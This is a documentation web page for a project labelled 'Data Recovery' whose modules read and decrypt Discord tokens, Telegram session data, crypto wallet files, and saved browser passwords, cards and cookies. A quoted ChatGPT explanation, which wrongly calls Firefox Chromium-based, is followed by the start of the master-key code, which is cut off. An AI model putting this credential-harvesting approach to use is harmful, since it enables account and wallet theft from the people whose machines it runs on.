<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-projects/data_recovery/how_it_works" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.1.0">
<title data-rh="true">How it works | Hirusha Adikari</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="https://hirusha.xyz/docs/projects/data_recovery/how_it_works"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="keywords" content="Hirusha Adikari, hirushaadi, hirusha-adi"><meta data-rh="true" name="keywords" content="blog, javascript, python, react, security, pentest, web, flask, django, osint"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="How it works | Hirusha Adikari"><meta data-rh="true" name="description" content="./config directory"><meta data-rh="true" property="og:description" content="./config directory"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://hirusha.xyz/docs/projects/data_recovery/how_it_works"><link data-rh="true" rel="alternate" href="https://hirusha.xyz/docs/projects/data_recovery/how_it_works" hreflang="en"><link data-rh="true" rel="alternate" href="https://hirusha.xyz/docs/projects/data_recovery/how_it_works" hreflang="x-default"><link rel="preconnect" href="https://www.google-analytics.com">
<link rel="preconnect" href="https://www.googletagmanager.com">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-XXQ76Y7DDY"></script>
<script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-XXQ76Y7DDY",{anonymize_ip:!0})</script>




<link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="Hirusha Adikari RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="Hirusha Adikari Atom Feed">
<link rel="alternate" type="application/json" href="/blog/feed.json" title="Hirusha Adikari JSON Feed">


<link rel="icon" href="/img/logo.png">
<link rel="manifest" href="/manifest.json">
<meta name="theme-color" content="#12affa">
<meta name="description" content="Hirusha Adikari">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/misans@4.0.0/lib/Normal/MiSans-Normal.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/misans@4.0.0/lib/Normal/MiSans-Semibold.min.css"><link rel="stylesheet" href="/assets/css/styles.35d68015.css">
<script src="/assets/js/runtime~main.062e38ac.js" defer="defer"></script>
<script src="/assets/js/main.f7b310ac.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_yvXN" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.png" alt="Hirusha Adikari" class="themedComponent_M27n themedComponent--light_GPEQ"><img src="/img/logo.png" alt="Hirusha Adikari" class="themedComponent_M27n themedComponent--dark_k3cb"></div></a></div><div class="navbar__items navbar__items--right"><a class="navbar__item navbar__link" href="/blog/">Blog</a><a class="navbar__item navbar__link" sidebarid="study" href="/docs/study/">Study</a><div class="navbar__item dropdown dropdown--hoverable dropdown--right"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link">Projects</a><ul class="dropdown__menu"><li><a class="dropdown__link" href="/project">All Projects</a></li><li><a aria-current="page" class="dropdown__link dropdown__link--active" href="/docs/projects/">Guides &amp; Documentation</a></li></ul></div><div class="navbar__item dropdown dropdown--hoverable dropdown--right"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link">Other Sections</a><ul class="dropdown__menu"><li><a class="dropdown__link" sidebarid="linux" href="/docs/linux/">Linux</a></li><li><a class="dropdown__link" sidebarid="windows" href="/docs/windows/">Windows</a></li><li><a class="dropdown__link" sidebarid="tutorials" href="/docs/tutorials">Tutorials</a></li><li><a class="dropdown__link" href="/recommended-tools">Recommended Tools</a></li><li><a class="dropdown__link" href="/contributions">Contributions</a></li><li><a class="dropdown__link" href="/blog/archive">Archive</a></li></ul></div><a href="https://photos.hirusha.xyz/" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">Photos<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_eQR1"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_L6F5 colorModeToggle_uW30"><button class="clean-btn toggleButton_qZDr toggleButtonDisabled_aZTb" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_A9tS"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_hboG"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_dWol"><button type="button" class="DocSearch DocSearch-Button" aria-label="Search"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">Search</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_hOWH"><div class="docsWrapper_EAFQ"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_KzkS" type="button"></button><div class="docRoot_Olan"><aside class="theme-doc-sidebar-container docSidebarContainer_oyBa"><div class="sidebarViewport_bTPf"><div class="sidebar_gLoG"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_XJLi"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/projects/">Projects Section</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" aria-expanded="true" href="/docs/projects/data_recovery/">Data Recovery</a><button aria-label="Collapse sidebar category &#x27;Data Recovery&#x27;" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/projects/data_recovery/build">Build</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/projects/data_recovery/how_it_works">How it works</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/projects/data_recovery/usage">Usage</a></li></ul></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/projects/geonode_free_proxies_api_wrapper">Genode Free Proxies API Wrapper</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/docs/projects/gifgang/">GifGang</a><button aria-label="Expand sidebar category &#x27;GifGang&#x27;" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav><button type="button" title="Collapse sidebar" aria-label="Collapse sidebar" class="button button--secondary button--outline collapseSidebarButton_JOzj"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_UUPU"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_sFV4"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_aHjh"><div class="docItemContainer_C1PC"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_yOFx" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YOK0"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/docs/projects/data_recovery/"><span itemprop="name">Data Recovery</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">How it works</span><meta itemprop="position" content="2"></li></ul></nav><div class="tocCollapsible_Ybdl theme-doc-toc-mobile tocMobile_QgTi"><button type="button" class="clean-btn tocCollapsibleButton_sr8m">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>How it works</h1></header><h2 class="anchor anchorWithStickyNavbar_lQ1M" id="config-directory"><code>./config</code> directory<a href="#config-directory" class="hash-link" aria-label="Direct link to config-directory" title="Direct link to config-directory">​</a></h2>
<p>the <code>./config</code> folder is what saves the basic configurations and supports the modules and the functionality of the tool</p>
<h3 class="anchor anchorWithStickyNavbar_lQ1M" id="configcolorspy"><code>./config/colors.py</code><a href="#configcolorspy" class="hash-link" aria-label="Direct link to configcolorspy" title="Direct link to configcolorspy">​</a></h3>
<ul>
<li>Helps to output colored text to the terminal. <a href="https://stackoverflow.com/questions/287871/how-do-i-print-colored-text-to-the-terminal" target="_blank" rel="noopener noreferrer">Click here</a> to learn more.</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_lQ1M" id="configconstantspy"><code>./config/constants.py</code><a href="#configconstantspy" class="hash-link" aria-label="Direct link to configconstantspy" title="Direct link to configconstantspy">​</a></h3>
<ul>
<li>Contains main settings for the tool to refer to and use during its runtime.</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_lQ1M" id="configmanagerpy"><code>./config/manager.py</code><a href="#configmanagerpy" class="hash-link" aria-label="Direct link to configmanagerpy" title="Direct link to configmanagerpy">​</a></h3>
<ul>
<li>Modules inherit from the ModuleManager class to facilitatse console output, logging, file operations easily.</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_lQ1M" id="modules-directory"><code>./modules</code> directory<a href="#modules-directory" class="hash-link" aria-label="Direct link to modules-directory" title="Direct link to modules-directory">​</a></h2>
<p>this is where it all happens</p>
<h3 class="anchor anchorWithStickyNavbar_lQ1M" id="modulesapplicationsdiscordpy"><code>./modules/applications/discord.py</code><a href="#modulesapplicationsdiscordpy" class="hash-link" aria-label="Direct link to modulesapplicationsdiscordpy" title="Direct link to modulesapplicationsdiscordpy">​</a></h3>
<ul>
<li>Display the banner and start using the tool</li>
<li>Data decryption funcions:<!-- -->
<ul>
<li><code>GetData</code>: A utility function that extracts data from a <code>DATA_BLOB</code> structure</li>
<li><code>CryptUnprotectData</code>: Utilizes the Windows API function <code>CryptUnprotectData</code> to decrypt encrypted bytes</li>
<li><code>DecryptValue</code>: Decrypts a given buffer using AES encryption</li>
</ul>
</li>
<li>Check if <code>Local State</code> file exists in the discord&#x27;s installation directory</li>
<li>Gets the master key from <code>Local State</code> file, decrypt it and load it</li>
<li>Search to relevant logs and database files inside the <code>Local Storage/leveldb</code> dir</li>
<li>extract and decrypt tokens using the masterkey</li>
<li>add to our own seperate list to to save if its unique</li>
<li>all these steps happens for all the discord versions with their own different installation paths (note that the internal structure is the same as they are all based on the same technology)</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_lQ1M" id="modulesapplicationszippy"><code>./modules/applications/zip.py</code><a href="#modulesapplicationszippy" class="hash-link" aria-label="Direct link to modulesapplicationszippy" title="Direct link to modulesapplicationszippy">​</a></h3>
<p>creates .zip archives of the directories mentioned below (some folders have been excluded in some paths as they are useless)</p>
<ol>
<li><strong>Telegram Desktop:</strong>
<ul>
<li><code>f&quot;{Constant.roaming_dir}\\Telegram Desktop\\tdata&quot;</code></li>
<li>What it might have:<!-- -->
<ul>
<li>User data such as chat history, settings, and media</li>
<li>Configuration files related to Telegram Desktop</li>
<li>Cached files for images, media, and emojis</li>
</ul>
</li>
</ul>
</li>
<li><strong>Atomic Wallet:</strong>
<ul>
<li><code>f&quot;{Constant.roaming_dir}\\tomic\\Local Storage\\leveldb&quot;</code></li>
<li>What it might have:<!-- -->
<ul>
<li>Local storage data for the Atomic Wallet application</li>
<li>LevelDB files containing user-specific information</li>
</ul>
</li>
</ul>
</li>
<li><strong>Exodus:</strong>
<ul>
<li><code>f&quot;{Constant.roaming_dir}\\Exodus\\exodus.wallet&quot;</code></li>
<li>What it might have:<!-- -->
<ul>
<li>Wallet data and configuration files for the Exodus cryptocurrency wallet</li>
<li>Information related to cryptocurrency transactions and holdings</li>
</ul>
</li>
</ul>
</li>
<li><strong>Steam:</strong>
<ul>
<li><code>&quot;C:\\Program Files (x86)\\Steam\\config&quot;</code></li>
<li>What it might have:<!-- -->
<ul>
<li>Steam client configuration files</li>
<li>Settings and preferences for the Steam gaming platform</li>
</ul>
</li>
</ul>
</li>
<li><strong>NationsGlory:</strong>
<ul>
<li><code>f&quot;{Constant.roaming_dir}\\NationsGlory\\Local Storage\\leveldb&quot;</code></li>
<li>What it might have:<!-- -->
<ul>
<li>Local storage data for the NationsGlory application</li>
<li>LevelDB files containing game-related information</li>
</ul>
</li>
</ul>
</li>
<li><strong>RiotClient:</strong>
<ul>
<li><code>f&quot;{Constant.local_dir}\\Riot Games\\Riot Client\\Data&quot;</code></li>
<li>What it might have:<!-- -->
<ul>
<li>Data related to the RiotClient for games like League of Legends</li>
<li>Configuration files, logs, or cached data</li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 class="anchor anchorWithStickyNavbar_lQ1M" id="modulesbrowsersbookmarkspy"><code>./modules/browsers/bookmarks.py</code><a href="#modulesbrowsersbookmarkspy" class="hash-link" aria-label="Direct link to modulesbrowsersbookmarkspy" title="Direct link to modulesbrowsersbookmarkspy">​</a></h3>
<ul>
<li>My implementation was slow compared to <span style="display:inline-flex;gap:0.25rem"><span></span><a href="https://github.com/browser-history/browser-history" target="_blank" rel="noopener noreferrer">this awesome python module</a></span> that can be installed via <code>pip install browser-history</code></li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_lQ1M" id="modulesbrowsershistorypy"><code>./modules/browsers/history.py</code><a href="#modulesbrowsershistorypy" class="hash-link" aria-label="Direct link to modulesbrowsershistorypy" title="Direct link to modulesbrowsershistorypy">​</a></h3>
<ul>
<li>My implementation was slow compared to <span style="display:inline-flex;gap:0.25rem"><span></span><a href="https://github.com/browser-history/browser-history" target="_blank" rel="noopener noreferrer">this awesome python module</a></span> that can be installed via <code>pip install browser-history</code></li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_lQ1M" id="modulesbrowserschromiumpy"><code>./modules/browsers/chromium.py</code><a href="#modulesbrowserschromiumpy" class="hash-link" aria-label="Direct link to modulesbrowserschromiumpy" title="Direct link to modulesbrowserschromiumpy">​</a></h3>
<ul>
<li>I still have a couple of doubts about how it works...</li>
</ul>
<details class="details_MWPH alert alert--info details_fvjc" data-collapsed="true"><summary>How ChatGPT (GPT-3.5) explained it:</summary><div><div class="collapsibleContent_R17e"><p></p><h4 class="anchor anchorWithStickyNavbar_lQ1M" id="query-1-how-does-it-work-im-pretty-technical-so-give-me-the-inner-workings--main-functionality-of-how-everything-works-code">Query 1: how does it work? im pretty technical, so give me the inner workings / main functionality of how everything works: [code]<a href="#query-1-how-does-it-work-im-pretty-technical-so-give-me-the-inner-workings--main-functionality-of-how-everything-works-code" class="hash-link" aria-label="Direct link to Query 1: how does it work? im pretty technical, so give me the inner workings / main functionality of how everything works: [code]" title="Direct link to Query 1: how does it work? im pretty technical, so give me the inner workings / main functionality of how everything works: [code]">​</a></h4><h4 class="anchor anchorWithStickyNavbar_lQ1M" id="result-1">Result 1:<a href="#result-1" class="hash-link" aria-label="Direct link to Result 1:" title="Direct link to Result 1:">​</a></h4><p>This script is a Python program that aims to recover sensitive information (such as passwords, cookies, credit card details, and web history) from Chromium-based browsers. It is adapted and improved from a source provided in the comments.</p><p>Let&#x27;s break down its main functionality:</p><h5 class="anchor anchorWithStickyNavbar_lQ1M" id="1-initialization">1. Initialization<a href="#1-initialization" class="hash-link" aria-label="Direct link to 1. Initialization" title="Direct link to 1. Initialization">​</a></h5><ul>
<li><strong>Importing Libraries:</strong> The script imports necessary libraries for working with file operations, encryption, and database handling.</li>
<li><strong>Class Definition:</strong> The script defines a class (<code>ChromiumRecovery</code>) that inherits from <code>ModuleManager</code>. It handles the recovery of information from Chromium-based browsers.</li>
</ul><h5 class="anchor anchorWithStickyNavbar_lQ1M" id="2-configuration-and-setup">2. Configuration and Setup<a href="#2-configuration-and-setup" class="hash-link" aria-label="Direct link to 2. Configuration and Setup" title="Direct link to 2. Configuration and Setup">​</a></h5><ul>
<li><strong>Banner Display:</strong> The script displays an ASCII art banner to signify the beginning of the tool&#x27;s execution.</li>
<li><strong>Browser Paths:</strong> It defines paths for various Chromium-based browsers, including Google Chrome, Microsoft Edge, Mozilla Firefox, Brave, etc.</li>
<li><strong>Initialization:</strong> The script sets up the output folder structure and initializes some variables and constants.</li>
</ul><h5 class="anchor anchorWithStickyNavbar_lQ1M" id="3-information-extraction">3. Information Extraction<a href="#3-information-extraction" class="hash-link" aria-label="Direct link to 3. Information Extraction" title="Direct link to 3. Information Extraction">​</a></h5><ul>
<li><strong>Master Key Extraction:</strong> The <code>__get_master_key</code> function attempts to extract the master key used for encrypting sensitive information from the browser&#x27;s local state file.</li>
<li><strong>Password Decryption:</strong> The <code>__decrypt_password</code> function decrypts the encrypted password using the master key.</li>
<li><strong>Data Retrieval Functions:</strong>
<ul>
<li><code>__get_login_data</code>: Retrieves saved login data (URL, username, decrypted password) from the browser&#x27;s Login Data database.</li>
<li><code>__get_credit_cards</code>: Retrieves credit card details (name, decrypted card number, expiration date) from the browser&#x27;s Web Data database.</li>
<li><code>__get_cookies</code>: Retrieves cookies (host key, cookie name, decrypted cookie value, expiration date) from the browser&#x27;s Cookies database.</li>
<li><code>__get_web_history</code>: Retrieves web history (URL, title, last visit time) from the browser&#x27;s History database (commented out by default due to potential slowness).</li>
</ul>
</li>
</ul><h5 class="anchor anchorWithStickyNavbar_lQ1M" id="4-results-handling">4. Results Handling<a href="#4-results-handling" class="hash-link" aria-label="Direct link to 4. Results Handling" title="Direct link to 4. Results Handling">​</a></h5><ul>
<li><strong>Result Saving:</strong> The script saves the extracted information into text files organized by browser type, profile, and data type (login, cookies, etc.).</li>
<li><strong>Folder Creation:</strong> It creates folders to organize the saved information.</li>
</ul><h5 class="anchor anchorWithStickyNavbar_lQ1M" id="5-execution">5. Execution<a href="#5-execution" class="hash-link" aria-label="Direct link to 5. Execution" title="Direct link to 5. Execution">​</a></h5><ul>
<li><strong>Browser Detection:</strong> The script identifies installed Chromium-based browsers on the system.</li>
<li><strong>Profile Loop:</strong> For each browser and profile combination, it attempts to recover login data, credit cards, cookies, and web history.</li>
<li><strong>Error Handling:</strong> The script includes error handling to log issues if they occur during the extraction process.</li>
</ul><h5 class="anchor anchorWithStickyNavbar_lQ1M" id="6-note">6. Note<a href="#6-note" class="hash-link" aria-label="Direct link to 6. Note" title="Direct link to 6. Note">​</a></h5><ul>
<li><strong>History Processing (Optional):</strong> There is commented-out code that would process web history. This part is left out by default due to potential slowness, and the script copies the history database for later processing.</li>
</ul><h5 class="anchor anchorWithStickyNavbar_lQ1M" id="7-logging">7. Logging<a href="#7-logging" class="hash-link" aria-label="Direct link to 7. Logging" title="Direct link to 7. Logging">​</a></h5><ul>
<li><strong>Debugging Messages:</strong> The script includes debugging messages (<code>self.mdebug</code>, <code>self.mprint</code>, <code>self.merror</code>) to provide information about the progress and potential issues.</li>
</ul><h5 class="anchor anchorWithStickyNavbar_lQ1M" id="8-execution">8. Execution<a href="#8-execution" class="hash-link" aria-label="Direct link to 8. Execution" title="Direct link to 8. Execution">​</a></h5><ul>
<li><strong>Main Execution Block:</strong> The script is structured to be run as a standalone module or part of a larger system. When executed, it goes through the process of recovering data from Chromium-based browsers.</li>
</ul><h5 class="anchor anchorWithStickyNavbar_lQ1M" id="9-miscellaneous">9. Miscellaneous<a href="#9-miscellaneous" class="hash-link" aria-label="Direct link to 9. Miscellaneous" title="Direct link to 9. Miscellaneous">​</a></h5><ul>
<li><strong>MIT License:</strong> The script includes the MIT License for open-source use.</li>
</ul><p>This script essentially acts as a password recovery tool, attempting to decrypt and extract sensitive information stored by Chromium-based browsers on the system.</p><h4 class="anchor anchorWithStickyNavbar_lQ1M" id="query-2-tell-me-everything-in-detail-about-3-information-extraction">Query 2: tell me everything in detail, about 3. Information Extraction<a href="#query-2-tell-me-everything-in-detail-about-3-information-extraction" class="hash-link" aria-label="Direct link to Query 2: tell me everything in detail, about 3. Information Extraction" title="Direct link to Query 2: tell me everything in detail, about 3. Information Extraction">​</a></h4><h4 class="anchor anchorWithStickyNavbar_lQ1M" id="result-1-1">Result 1:<a href="#result-1-1" class="hash-link" aria-label="Direct link to Result 1:" title="Direct link to Result 1:">​</a></h4><p>Certainly, let&#x27;s delve into the details of the information extraction part of the script, specifically the functions responsible for retrieving login data, credit cards, cookies, and web history.</p><h5 class="anchor anchorWithStickyNavbar_lQ1M" id="31-master-key-extraction">3.1 Master Key Extraction<a href="#31-master-key-extraction" class="hash-link" aria-label="Direct link to 3.1 Master Key Extraction" title="Direct link to 3.1 Master Key Extraction">​</a></h5><p>The <code>__get_master_key</code> function attempts to extract the master key used for encrypting sensitive information from the browser&#x27;s local state file.</p><div class="language-python codeBlockContainer_APcc theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_m3Ux"><pre tabindex="0" class="prism-code language-python codeBlock_qGQc thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_p187"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">__get_master_key</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> browser_path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> browser_name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">None</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">bytes</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">not</span><span class="token plain"> os</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">exists</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">browser_path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    filename </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> browser_path </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;\\Local State&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">with</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">open</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">filename</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;r&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 